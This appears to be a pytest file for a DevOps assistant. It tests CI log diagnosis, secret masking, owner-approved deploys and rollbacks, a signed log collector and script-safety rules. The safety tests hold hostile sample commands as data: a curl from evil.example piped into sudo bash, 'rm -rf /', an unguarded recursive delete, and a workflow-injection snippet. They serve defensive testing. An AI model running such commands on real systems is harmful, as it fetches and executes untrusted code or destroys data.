"""DevOps Sahayak: CI failure library + log clustering + masking + script safety rules, GitHub Actions watching through a fake
GitHub (failure explained with the exact step, flaky by re-run of the same commit, environment approval card), production deploy
cards that only her tap dispatches (hash, checks, branch moved, reason), rollback, re-run gate, read-only HMAC collector, endpoint
uptime / SSL, tools (staff / customer / tokens), API incl. the public collector route, worker tick."""
import base64
import hashlib
import hmac
import importlib.util
import json
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import httpx
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

import app.devops.models  # noqa: F401  (tables for the env fixture's init_db)
from tests.test_life import conv_ctx

T = "default"
TOKEN = "github_pat_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3"
SHA1, SHA2, SHA3 = "a" * 40, "b" * 40, "c" * 40

NPM_LOG = """2026-10-23T05:00:01.0000000Z ##[group]Run npm ci
2026-10-23T05:00:02.0000000Z npm ERR! code ERESOLVE
2026-10-23T05:00:02.0000000Z npm ERR! ERESOLVE unable to resolve dependency tree
2026-10-23T05:00:02.0000000Z npm ERR! Could not resolve dependency: peer react@"^17" from react-foo@2.1.0
2026-10-23T05:00:03.0000000Z ##[error]Process completed with exit code 1.
"""
PYTEST_LOG = """##[group]Run python -m pytest -q
..F.
FAILED tests/test_pay.py::test_refund_rounding - AssertionError: assert 99.99 == 100
=========== 1 failed, 3 passed in 2.10s ===========
##[error]Process completed with exit code 1.
"""
NET_LOG = """Run pip install -r requirements.txt
ERROR: Could not install packages due to an OSError: HTTPSConnectionPool: Read timed out. ECONNRESET
##[error]Process completed with exit code 1.
"""


class FakeGH:
    def __init__(self):
        self.runs = []
        self.jobs = {}
        self.logs = {}
        self.heads = {"main": SHA2}
        self.checks = {SHA2: [{"name": "test", "status": "completed", "conclusion": "success"}]}
        self.dispatched = []
        self.reruns = []
        self.reviews = []
        self.pending = {}
        self.extra_runs = {}
        self.deploy_yml = "name: Deploy\non:\n  workflow_dispatch:\n    inputs:\n      sha:\n        required: true\njobs: {}\n"

    def __call__(self, req: httpx.Request) -> httpx.Response:
        p, m = req.url.path, req.method
        if req.url.host == "pipelines.example":
            assert "authorization" not in {k.lower() for k in req.headers}          # token never sent to the log host
            return httpx.Response(200, text=self.logs.get(p.rsplit("/", 1)[-1], ""))
        assert req.headers.get("authorization") == f"Bearer {TOKEN}"
        R = "/repos/o/app"
        if p == "/user":
            return httpx.Response(200, json={"login": "meghana"})
        if p == R:
            return httpx.Response(200, json={"default_branch": "main", "private": True})
        if p == R + "/actions/workflows":
            return httpx.Response(200, json={"workflows": [{"path": ".github/workflows/ci.yml", "name": "CI"},
                                                           {"path": ".github/workflows/deploy.yml", "name": "Deploy"}]})
        if p == R + "/contents/.github/workflows/deploy.yml":
            return httpx.Response(200, json={"encoding": "base64", "content": base64.b64encode(self.deploy_yml.encode()).decode()})
        if p == R + "/actions/runs" or p.startswith(R + "/actions/workflows/") and p.endswith("/runs"):
            return httpx.Response(200, json={"workflow_runs": list(self.runs)})
        if p.endswith("/dispatches") and m == "POST":
            body = json.loads(req.content)
            self.dispatched.append({"path": p, **body})
            return httpx.Response(200, json={"workflow_run_id": 999, "run_url": "x", "html_url": "https://github.com/o/app/actions/runs/999"})
        if p.endswith("/rerun-failed-jobs"):
            self.reruns.append(p)
            return httpx.Response(201)
        if p.endswith("/pending_deployments"):
            rid = int(p.split("/")[-2])
            if m == "POST":
                self.reviews.append(json.loads(req.content))
                return httpx.Response(200, json=[])
            return httpx.Response(200, json=self.pending.get(rid, []))
        if "/actions/jobs/" in p and p.endswith("/logs"):
            jid = p.split("/")[-2]
            return httpx.Response(302, headers={"location": f"https://pipelines.example/log/{jid}"})
        if "/attempts/" in p and p.endswith("/jobs"):
            rid, att = int(p.split("/")[-4]), int(p.split("/")[-2])
            return httpx.Response(200, json={"jobs": self.jobs.get((rid, att), [])})
        if "/attempts/" in p:
            rid, att = int(p.split("/")[-3]), int(p.split("/")[-1])
            r = next((x for x in self.runs if x["id"] == rid), {})
            return httpx.Response(200, json={**r, "run_attempt": att, "conclusion": "failure" if att < r.get("run_attempt", 1) else r.get("conclusion")})
        if p.startswith(R + "/actions/runs/"):
            rid = int(p.split("/")[-1])
            r = self.extra_runs.get(rid) or next((x for x in self.runs if x["id"] == rid), None)
            return httpx.Response(200, json=r) if r else httpx.Response(404, json={"message": "Not Found"})
        if p.endswith("/check-runs"):
            sha = p.split("/")[-2]
            return httpx.Response(200, json={"check_runs": self.checks.get(sha, [])})
        if p.endswith("/status"):
            return httpx.Response(200, json={"statuses": []})
        if p.startswith(R + "/commits/"):
            ref = p.split("/")[-1]
            sha = self.heads.get(ref) or (ref if len(ref) == 40 else None)
            return httpx.Response(200, json={"sha": sha, "commit": {"message": "x"}}) if sha else httpx.Response(404, json={"message": "No commit"})
        if p.startswith(R + "/compare/"):
            return httpx.Response(200, json={"ahead_by": 2, "commits": [
                {"sha": SHA2, "commit": {"message": "Add refund page\n\nlong", "author": {"name": "Ramesh"}}},
                {"sha": SHA2, "commit": {"message": "token=ghp_abcdefghijklmnopqrstuvwxyz1234 oops", "author": {"name": "Asha"}}}],
                "files": [{"filename": "src/pay.js", "additions": 10, "deletions": 2}, {"filename": "db/migrations/0042_refund.sql", "additions": 5}]})
        return httpx.Response(404, json={"message": f"no route {m} {p}"})


def run_json(rid, sha, conclusion, path=".github/workflows/ci.yml", attempt=1, status="completed", name="CI", minutes=4, branch="main",
             title="Fix stuff", start=None):
    st = start or datetime(2026, 10, 23, 4, 0, tzinfo=timezone.utc)
    return {"id": rid, "run_attempt": attempt, "name": name, "path": path, "head_branch": branch, "head_sha": sha, "event": "push",
            "display_title": title, "status": status, "conclusion": conclusion if status == "completed" else None,
            "run_started_at": st.isoformat().replace("+00:00", "Z"), "updated_at": (st + timedelta(minutes=minutes)).isoformat().replace("+00:00", "Z"),
            "created_at": st.isoformat().replace("+00:00", "Z"), "html_url": f"https://github.com/o/app/actions/runs/{rid}",
            "head_commit": {"message": title, "timestamp": (st - timedelta(hours=2)).isoformat().replace("+00:00", "Z")}}


@pytest.fixture
def dv(env, monkeypatch):
    from app.devops import github as G
    from app.devops import service as S
    events = []
    monkeypatch.setattr(S, "_publish", lambda tenant, kind, payload, conv="": events.append((kind, payload)))
    monkeypatch.setattr(S, "_model", lambda system, text: "")
    monkeypatch.setattr(S, "_store_file", lambda tenant, name, content, conv, title: {"file_id": "f_" + name})
    monkeypatch.setattr(S, "_PUBLIC_CHECK", lambda host: (_ for _ in ()).throw(S.DevopsError("not public")) if host.startswith(("10.", "127.", "localhost")) else None)
    fake = FakeGH()
    G.set_transport(httpx.MockTransport(fake))
    S.EVENTS, S.FAKE = events, fake
    yield S
    G.set_transport(None)
    S.set_http(None)


def kinds(S):
    return [k for k, _ in S.EVENTS]


def joined(S):
    S.connect_github(T, TOKEN)
    return S.add_repo(T, "o/app", "deploy.yml", "production")


# ---------------------------------------------------------------- rules
def test_ci_library_logs_masking_and_script_rules():
    from app.devops import rules as R
    from app.devops import templates as TP
    assert R.classify_ci(NPM_LOG)["category"] == "dependency"
    c = R.classify_ci(PYTEST_LOG)
    assert c["category"] == "test_failure" and c["flaky_likely"]
    assert R.failed_tests(PYTEST_LOG) == ["tests/test_pay.py::test_refund_rounding"]
    assert R.classify_ci("FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory")["category"] == "oom"
    assert R.classify_ci("write /tmp/x: no space left on device")["category"] == "disk_full"
    assert R.classify_ci("Error: Input required and not supplied: token")["category"] == "secret_missing"
    assert R.classify_ci("/home/runner/work/_temp/x.sh: line 1: ./gradlew: Permission denied")["category"] == "permission"
    n = R.classify_ci(NET_LOG)
    assert n["category"] == "network" and n["flaky_likely"]
    assert R.classify_ci("everything fine")["category"] == "unknown"
    lines = R.error_lines(NPM_LOG)
    assert any("ERESOLVE" in x for x in lines) and not any(x.startswith("2026-") for x in lines)
    # masking: tokens, passwords, connection strings, long numbers
    m = R.mask("db=postgres://app:S3cretPw@db:5432/x token=ghp_abcdefghijklmnopqrstuvwxyz123456 password=hunter22 card 4111111111111111")
    assert "S3cretPw" not in m and "ghp_abc" not in m and "hunter22" not in m and "4111111111111111" not in m
    # log entries + clustering keys: a python traceback = one entry; same error with other numbers = same signature
    tb = ("Traceback (most recent call last):\n  File \"/srv/app/pay.py\", line 42, in refund\n    amt = order['amount'] / qty\n"
          "ZeroDivisionError: division by zero\n")
    ents = R.entries(tb + "2026/10/23 05:00:01 [error] 812#812: *91 connect() failed (111: Connection refused) while connecting to upstream, "
                     "client: 1.2.3.4, server: shop.in, request: \"GET /api/orders/77 HTTP/1.1\", upstream: \"http://127.0.0.1:3000/api/orders/77\"\n")
    assert len(ents) == 2 and ents[0]["trace"] and "ZeroDivisionError" in ents[0]["key"] and "pay.py" in ents[0]["key"]
    assert R.classify_log(ents[1]["text"]) == "upstream_down"
    a = R.normalize("2026/10/23 05:00:01 [error] 812#812: *91 connect() failed upstream: \"http://127.0.0.1:3000/api/orders/77\"")
    b = R.normalize("2026/10/24 06:10:09 [error] 900#900: *12 connect() failed upstream: \"http://127.0.0.1:3000/api/orders/1234\"")
    assert a == b
    assert R.detect_format(["2026/10/23 05:00:01 [error] 1#1: x"]) == "nginx"
    # script safety
    blocks = lambda c, lang="bash": {f["rule"] for f in R.check_script(c, lang) if f["level"] == "block"}  # noqa: E731
    assert "rm_unguarded_var" in blocks("#!/bin/bash\nset -euo pipefail\nrm -rf $BUILD_DIR/\n")
    assert not blocks('#!/bin/bash\nset -euo pipefail\nrm -rf "${BUILD_DIR:?}/"\n')
    assert "rm_root" in blocks("set -euo pipefail\nrm -rf / \n")
    assert "pipe_to_shell" in blocks("set -euo pipefail\ncurl -fsSL https://evil.example/x.sh | sudo bash\n")
    assert not blocks("set -euo pipefail\ncurl -fsSL https://get.docker.com | sh\n")                   # known host = warn only
    assert "inline_secret" in blocks('set -euo pipefail\nDB_PASSWORD="Ramesh@1234"\n')
    assert any(f["rule"] == "no_strict" for f in R.check_script("echo hi\n", "bash"))
    assert "gha_injection" in blocks("on: pull_request\njobs:\n  a:\n    steps:\n      - run: echo \"${{ github.event.pull_request.title }}\"\n", "yaml")
    assert "ps_rm_var" in blocks("Remove-Item -Recurse -Force $Path\n", "powershell")
    assert "docker_secret" in blocks("FROM node:20\nENV API_TOKEN=abc123\nUSER node\n", "dockerfile")
    for kind in TP.KINDS:
        name, lang, content = TP.render(kind, {})
        assert R.verdict(R.check_script(content, lang)) != "block", (kind, R.check_script(content, lang))
    # DORA
    base = datetime(2026, 10, 1, tzinfo=timezone.utc)
    ds = [{"at": base + timedelta(days=i), "ok": True, "commit_at": base + timedelta(days=i, hours=-4), "title": "feat"} for i in range(10)]
    ds.append({"at": base + timedelta(days=10), "ok": False, "commit_at": base + timedelta(days=10, hours=-1), "title": "hotfix prod"})
    ds.append({"at": base + timedelta(days=10, hours=2), "ok": True, "commit_at": None, "title": "revert", "rollback": True})
    d = R.dora(ds, 30, base + timedelta(days=20))
    assert d["successful"] == 10 and d["lead_time_h"] == 4.0 and d["failed"] == 2 and d["recovery_h"] == 2.0
    assert d["change_failure_pct"] == pytest.approx(9.1, abs=0.1) and d["rework_pct"] == pytest.approx(9.1, abs=0.1)
    assert R.trend([600] * 10 + [300] * 10)["slower"] is True


# ---------------------------------------------------------------- builds
def test_failed_build_explained_flaky_and_env_review(dv):
    S, G = dv, dv.FAKE
    with pytest.raises(S.DevopsError):
        S.connect_github(T, "not-a-token")
    out = joined(S)
    assert out["repo"]["deploy_workflow"] == "deploy.yml" and out["repo"]["deploy_inputs"] == ["sha"]
    st = S.settings(T)
    assert st["github"] == {"joined": True, "login": "meghana", "checked": st["github"]["checked"]}
    assert TOKEN not in json.dumps(S.overview(T))
    # a failed CI run: job + failing step + kind + fix, card once
    G.runs = [run_json(11, SHA1, "failure")]
    G.jobs[(11, 1)] = [{"id": 501, "name": "build", "conclusion": "failure", "html_url": "u",
                        "steps": [{"name": "Set up job", "number": 1, "conclusion": "success"}, {"name": "Run npm ci", "number": 3, "conclusion": "failure"}]}]
    G.logs["501"] = NPM_LOG
    r = S.sync(T)
    assert r["failed"] == 1
    card = [p for k, p in S.EVENTS if k == "devops_build"][-1]
    assert card["run"]["diagnosis"]["category"] == "dependency" and card["run"]["diagnosis"]["step"] == "Run npm ci"
    assert "Run npm ci" in card["say"] and card["push"]
    S.sync(T)
    assert kinds(S).count("devops_build") == 1                      # told once
    # a test failing then passing on re-run of the same commit = flaky; the test name gets a flip
    G.runs = [run_json(12, SHA2, "failure", start=datetime(2026, 10, 23, 5, 0, tzinfo=timezone.utc))]
    G.jobs[(12, 1)] = [{"id": 502, "name": "test", "conclusion": "failure", "steps": [{"name": "Run python -m pytest -q", "number": 4, "conclusion": "failure"}]}]
    G.logs["502"] = PYTEST_LOG
    S.sync(T)
    G.runs = [run_json(12, SHA2, "success", attempt=2, start=datetime(2026, 10, 23, 5, 0, tzinfo=timezone.utc))]
    assert S.sync(T)["flaky"] == 1
    h = S.build_health(T)
    assert h["flaky_tests"][0]["name"] == "tests/test_pay.py::test_refund_rounding"
    assert any(r["flaky"] for r in S.runs(T, status="flaky"))
    # a pasted CI log without GitHub
    assert S.explain_ci_log(T, NET_LOG)["category"] == "network"
    # re-run: only her tap, never a deploy workflow
    with pytest.raises(S.DevopsError):
        S.rerun(T, S.runs(T, status="failed")[0]["key"])
    key = next(r["key"] for r in S.runs(T) if r["run_id"] == 11)
    S.rerun(T, key, by_tap=True)
    assert G.reruns == ["/repos/o/app/actions/runs/11/rerun-failed-jobs"]
    # a run waiting on a protected environment -> her approval card; only her tap approves in GitHub
    G.runs = [run_json(13, SHA2, None, path=".github/workflows/deploy.yml", status="waiting", name="Deploy")]
    G.pending[13] = [{"environment": {"id": 77, "name": "production"}, "current_user_can_approve": True}]
    assert S.sync(T)["reviews"] == 1
    card = [p for k, p in S.EVENTS if k == "devops_deploy"][-1]["deploy"]
    assert card["kind"] == "env_review" and card["review"]["environment_ids"] == [77]
    with pytest.raises(S.DevopsError):
        S.decide_deploy(T, card["id"], True, card["hash"])
    S.decide_deploy(T, card["id"], True, card["hash"], by_tap=True)
    assert G.reviews == [{"environment_ids": [77], "state": "approved", "comment": f"Approved by owner in Hoola ({card['number']})"}]
    S.sync(T)
    assert len([d for d in S.deploys(T) if d["kind"] == "env_review"]) == 1      # no second card for the same run


# ---------------------------------------------------------------- deploys
def test_deploy_card_only_her_tap_dispatches_and_rollback(dv):
    S, G = dv, dv.FAKE
    joined(S)
    # earlier production deploys seen in GitHub: SHA3 (older) then SHA1 (current)
    G.runs = [run_json(21, SHA3, "success", path=".github/workflows/deploy.yml", name="Deploy", start=datetime(2026, 10, 20, 4, 0, tzinfo=timezone.utc)),
              run_json(22, SHA1, "success", path=".github/workflows/deploy.yml", name="Deploy", start=datetime(2026, 10, 21, 4, 0, tzinfo=timezone.utc))]
    S.sync(T)
    # the tool can only make a card
    from app.agent.devops_tools import DEVOPS_HANDLERS
    import asyncio
    ctx = conv_ctx()
    out = asyncio.run(DEVOPS_HANDLERS["devops"](ctx, action="deploy", repo="o/app"))
    assert out["needs_tap"] and out["status"] == "card" and not G.dispatched
    assert out["full_sha"] == SHA2 and out["checks"]["state"] == "success" and out["changes"]["migration"]
    assert out["rollback"]["full_sha"] == SHA1 and "ghp_" not in json.dumps(out)
    assert any("migration" in w.lower() for w in out["warnings"])
    did, h = out["id"], out["hash"]
    with pytest.raises(S.DevopsError):
        S.decide_deploy(T, did, True, h)                                       # not a tap
    with pytest.raises(S.DevopsError):
        S.decide_deploy(T, did, True, "x" * 24, by_tap=True)                   # wrong card
    # checks turned red after the card -> needs her written reason
    G.checks[SHA2] = [{"name": "test", "status": "completed", "conclusion": "failure"}]
    with pytest.raises(S.DevopsError) as e:
        S.decide_deploy(T, did, True, h, by_tap=True)
    assert "wajah" in str(e.value) and not G.dispatched
    r = S.decide_deploy(T, did, True, h, force_reason="client demo hai, test flaky hai", by_tap=True)
    assert r["deploy"]["status"] == "dispatched" and r["deploy"]["forced"]
    assert G.dispatched == [{"path": "/repos/o/app/actions/workflows/deploy.yml/dispatches", "ref": "main", "return_run_details": True,
                             "inputs": {"sha": SHA2}}]
    assert S.decide_deploy(T, did, True, h, by_tap=True)["say"].startswith("Is card par faisla")   # once only
    # tracked to success by the sync
    G.extra_runs[999] = run_json(999, SHA2, "success", path=".github/workflows/deploy.yml", name="Deploy")
    S.sync(T)
    assert S.deploy_view(T, did)["status"] == "success"
    # rollback card -> previous good deploy; tap dispatches the old commit
    rb = S.request_rollback(T, "o/app")
    assert rb["kind"] == "rollback" and rb["full_sha"] in (SHA1, SHA3) and rb["checks"]["state"] == "skip"
    S.decide_deploy(T, rb["id"], True, rb["hash"], by_tap=True)
    assert G.dispatched[-1]["inputs"] == {"sha": rb["full_sha"]}
    # no sha input: branch deploy; branch moving after the card makes it stale
    G.deploy_yml = "name: Deploy\non: workflow_dispatch\njobs: {}\n"
    S.add_repo(T, "o/app", "deploy.yml")
    G.checks[SHA2] = [{"name": "test", "status": "completed", "conclusion": "success"}]
    c = S.request_deploy(T, "o/app")
    G.heads["main"] = SHA3
    with pytest.raises(S.DevopsError) as e:
        S.decide_deploy(T, c["id"], True, c["hash"], by_tap=True)
    assert "aage badh gaya" in str(e.value) and S.deploy_view(T, c["id"])["status"] == "stale"
    with pytest.raises(S.DevopsError):
        S.request_deploy(T, "o/app", ref=SHA1)                                  # exact commit needs a sha input
    # a newer card makes an older one stale; Mana = nothing runs
    c1 = S.request_deploy(T, "o/app")
    c2 = S.request_deploy(T, "o/app")
    assert S.deploy_view(T, c1["id"])["status"] == "stale"
    n = len(G.dispatched)
    S.decide_deploy(T, c2["id"], False, c2["hash"], by_tap=True)
    assert len(G.dispatched) == n and S.deploy_view(T, c2["id"])["status"] == "rejected"
    d = S.dora(T, 30)
    assert d["successful"] >= 2


# ---------------------------------------------------------------- logs + collector
def test_logs_cluster_and_signed_collector(dv, monkeypatch):
    S = dv
    log = ("0|shop  | Error: connect ECONNREFUSED 127.0.0.1:5432\n"
           "0|shop  | Error: connect ECONNREFUSED 127.0.0.1:5432\n"
           "2026/10/23 05:00:01 [error] 812#812: *91 connect() failed (111: Connection refused) while connecting to upstream, upstream: \"http://127.0.0.1:3000/a/1\"\n"
           "2026/10/23 05:00:09 [error] 812#812: *92 connect() failed (111: Connection refused) while connecting to upstream, upstream: \"http://127.0.0.1:3000/a/2\"\n"
           "INFO all good password=hunter22\n")
    r = S.ingest_logs(T, log, "vps1")
    cats = {c["category"]: c["count"] for c in r["clusters"]}
    assert cats == {"db_down": 2, "upstream_down": 2}
    assert kinds(S).count("devops_alert") == 2                                 # serious kinds, once each
    S.ingest_logs(T, log, "vps1")
    assert kinds(S).count("devops_alert") == 2 and S.clusters(T)[0]["count"] == 4
    assert all("hunter22" not in json.dumps(c) for c in S.clusters(T))
    cid = next(c["id"] for c in S.clusters(T) if c["category"] == "db_down")
    S.set_cluster(T, cid, "fixed")
    S.ingest_logs(T, log, "vps1")
    assert next(c for c in S.clusters(T) if c["id"] == cid)["status"] == "new"   # came back
    assert S.runbook("db_down")["steps"]
    # collector: secret shown once, never in lists; HMAC + time + replay + rate
    col = S.create_collector(T, "vps1")
    assert col["secret"] and col["secret"] not in json.dumps(S.collectors(T))
    body = json.dumps({"source": "vps1", "host": "vps1", "lines": ["Out of memory: Killed process 4242 (node) total-vm:2048kB"],
                       "disk": [{"mount": "/", "used_pct": 91.5, "free_gb": 2.1}]}).encode()
    ts = str(int(time.time()))
    sig = hmac.new(col["secret"].encode(), f"{col['id']}\n{ts}\n{hashlib.sha256(body).hexdigest()}".encode(), hashlib.sha256).hexdigest()
    with pytest.raises(PermissionError):
        S.collect(col["id"], ts, "0" * 64, body)
    with pytest.raises(PermissionError):
        S.collect(col["id"], str(int(time.time()) - 3600), sig, body)
    ok = S.collect(col["id"], ts, sig, body)
    assert ok["ok"] and ok["errors"] == 1
    with pytest.raises(PermissionError):
        S.collect(col["id"], ts, sig, body)                                    # replay
    alerts = [p for k, p in S.EVENTS if k == "devops_alert"]
    assert any(a.get("kind") == "disk" and a["used_pct"] == 91.5 for a in alerts)
    assert any(a.get("kind") == "log" and a["cluster"]["category"] == "oom_kill" for a in alerts)
    assert S.collectors(T)[0]["disk"][0]["used_pct"] == 91.5
    S.revoke_collector(T, col["id"])
    with pytest.raises(PermissionError):
        S.collect(col["id"], ts, sig, body)
    # the shipped agent script compiles, is stdlib-only, and signs exactly like the server checks
    src = Path(S.__file__).parent / "collector" / "hoola_log_agent.py"
    spec = importlib.util.spec_from_file_location("hoola_log_agent", src)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    assert "ghp_" not in mod.mask("tok ghp_abcdefghijklmnopqrstuvwxyz123456") and mod.pick(["ok", "ERROR boom", "  at x (a.js:1)"]) == ["ERROR boom", "  at x (a.js:1)"]
    col2 = S.create_collector(T, "vps2")
    sent = {}

    class Resp:
        status = 200

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def fake_open(req, timeout=0):
        sent["r"] = req
        return Resp()
    monkeypatch.setattr(mod.urllib.request, "urlopen", fake_open)
    mod.send("https://hoola.example", col2["id"], col2["secret"], {"source": "vps2", "lines": ["fatal: boom"]})
    rq = sent["r"]
    assert S.collect(col2["id"], rq.headers["X-hoola-time"], rq.headers["X-hoola-sign"], rq.data)["ok"]


# ---------------------------------------------------------------- scripts, checklists, endpoints
def test_scripts_checklists_and_endpoints(dv, monkeypatch):
    S = dv
    v = S.make_script(T, "backup", {"what": "postgres", "name": "shopdb", "keep_days": "7"}, conv="")
    assert v["verdict"] in ("ok", "warn") and "pg_dump" in v["content"] and v["file_id"] and "set -euo pipefail" in v["content"]
    with pytest.raises(S.DevopsError):
        S.make_script(T, "custom", {}, "")
    monkeypatch.setattr(S, "_model", lambda system, text: "```bash\n#!/bin/bash\nrm -rf $DIR\n```")
    c = S.make_script(T, "custom", {}, "purane uploads hatao")
    assert c["verdict"] == "block" and any(f["rule"] == "rm_unguarded_var" for f in c["findings"])
    own = S.check_script(T, "#!/bin/bash\nexport GH=ghp_abcdefghijklmnopqrstuvwxyz123456\n", "deploy.sh")
    assert own["verdict"] == "block" and "rotate" in own["say"] and "ghp_abc" not in own["content"]
    ck = S.make_checklist(T, "deploy")
    assert ck["total"] > 10 and not ck["complete"]
    ck2 = S.tick_item(T, ck["id"], ck["items"][0]["id"], True, "owner")
    assert ck2["done"] == 1
    with pytest.raises(S.DevopsError):
        S.add_endpoint(T, "http://10.0.0.5/health")
    with pytest.raises(S.DevopsError):
        S.add_endpoint(T, "https://shop.example:8443/")
    e = S.add_endpoint(T, "https://shop.example/health", "Shop", keyword="ok")["endpoint"]
    state = {"up": True}
    S.set_http(httpx.MockTransport(lambda r: httpx.Response(200, text="all ok") if state["up"] else httpx.Response(502, text="bad")))
    monkeypatch.setattr(S, "_SSL_DAYS", lambda host: 5)
    S.watch(T)
    assert S.endpoints(T)[0]["up"] is True and any(p.get("kind") == "ssl" for k, p in S.EVENTS if k == "devops_alert")
    state["up"] = False
    S.watch(T)
    assert not any(p.get("kind") == "down" for k, p in S.EVENTS if k == "devops_alert")      # one miss is not an alert
    S.watch(T)
    downs = [p for k, p in S.EVENTS if k == "devops_alert" and p.get("kind") == "down"]
    assert len(downs) == 1 and "502" in downs[0]["say"]
    state["up"] = True
    S.watch(T)
    assert [p for k, p in S.EVENTS if k == "devops_alert"][-1]["kind"] == "up"
    assert S.endpoints(T)[0]["uptime_pct"] == 50.0
    S.remove_endpoint(T, e["id"])


# ---------------------------------------------------------------- tools, API, worker
def test_tools_api_and_tick(dv, monkeypatch):
    S, G = dv, dv.FAKE
    import asyncio

    from app.agent.devops_tools import DEVOPS_HANDLERS, DEVOPS_TOOLS
    from app.agent.tools import ToolError
    assert {t["name"] for t in DEVOPS_TOOLS} == set(DEVOPS_HANDLERS)
    ctx = conv_ctx()
    with pytest.raises(ToolError):
        asyncio.run(DEVOPS_HANDLERS["devops"](ctx, action="script", kind="custom", ask=f"use {TOKEN}"))   # tokens never taken
    staff = conv_ctx()
    staff.actor = "staff:x"
    with pytest.raises(ToolError):
        asyncio.run(DEVOPS_HANDLERS["devops"](staff, action="repo_add", repo="o/app"))
    cust = conv_ctx()
    cust.actor = "customer:wa:9876543210"
    with pytest.raises(ToolError):
        asyncio.run(DEVOPS_HANDLERS["devops_dekho"](cust, what="day"))
    r = asyncio.run(DEVOPS_HANDLERS["devops"](staff, action="logs", text="Error: ENOSPC: no space left on device, write", source="vps"))
    assert r["clusters"][0]["category"] == "disk_full"
    assert asyncio.run(DEVOPS_HANDLERS["devops_dekho"](ctx, what="rules"))["never"]
    # API (key-protected) + public collector route
    from app.devops.api import make_router
    app = FastAPI()
    app.include_router(make_router(lambda: None, lambda: T))
    c = TestClient(app)
    assert c.put("/api/devops/github", json={"token": TOKEN}).json()["login"] == "meghana"
    assert c.post("/api/devops/repos", json={"repo": "o/app", "deploy_workflow": "deploy.yml"}).status_code == 200
    ov = c.get("/api/devops").json()
    assert ov["settings"]["github"]["joined"] and TOKEN not in json.dumps(ov)
    card = c.post("/api/devops/deploys", json={"repo": "o/app"}).json()
    assert card["status"] == "card" and not G.dispatched
    assert c.post(f"/api/devops/deploys/{card['id']}/decide", json={"yes": True, "hash": "bad"}).status_code == 400
    ok = c.post(f"/api/devops/deploys/{card['id']}/decide", json={"yes": True, "hash": card["hash"]}).json()
    assert ok["deploy"]["status"] == "dispatched" and len(G.dispatched) == 1
    assert c.post("/api/devops/scripts", json={"kind": "nginx", "params": {"domain": "shop.in"}}).json()["lang"] == "nginx"
    col = c.post("/api/devops/collectors", json={"name": "vps1"}).json()
    assert "hoola_log_agent" in c.get(f"/api/devops/collectors/{col['id']}/script").text
    assert c.post(f"/api/devops/collect/{col['id']}", content=b"{}", headers={"X-Hoola-Time": "1", "X-Hoola-Sign": "x"}).status_code == 403
    body = json.dumps({"lines": ["FATAL: too many connections for role app"]}).encode()
    ts = str(int(time.time()))
    sig = hmac.new(col["secret"].encode(), f"{col['id']}\n{ts}\n{hashlib.sha256(body).hexdigest()}".encode(), hashlib.sha256).hexdigest()
    assert c.post(f"/api/devops/collect/{col['id']}", content=body, headers={"X-Hoola-Time": ts, "X-Hoola-Sign": sig}).json()["ok"]
    assert c.post("/api/devops/logs/upload", files={"file": ("err.log", b"panic: runtime error: index out of range\n")},
                  data={"source": "api"}).json()["errors"] == 1
    # worker: syncs, morning note once
    G.runs = [run_json(31, SHA1, "failure")]
    G.jobs[(31, 1)] = [{"id": 601, "name": "build", "conclusion": "failure", "steps": [{"name": "Build", "number": 2, "conclusion": "failure"}]}]
    G.logs["601"] = "src/a.ts(3,1): error TS2304: Cannot find name 'x'.\n##[error]Process completed with exit code 2."
    with __import__("app.db", fromlist=["session"]).session() as s:
        st = s.get(app_models().DevopsSettings, T)
        st.last_sync, st.morning_time = None, "00:00"
    out = S.tick()
    assert out["synced"] == 1 and out["morning"] == 1 and "devops_day" in kinds(S)
    assert S.tick()["morning"] == 0
    assert any(r["diagnosis"].get("category") == "compile" for r in S.runs(T, status="failed"))


def app_models():
    import app.devops.models as M
    return M
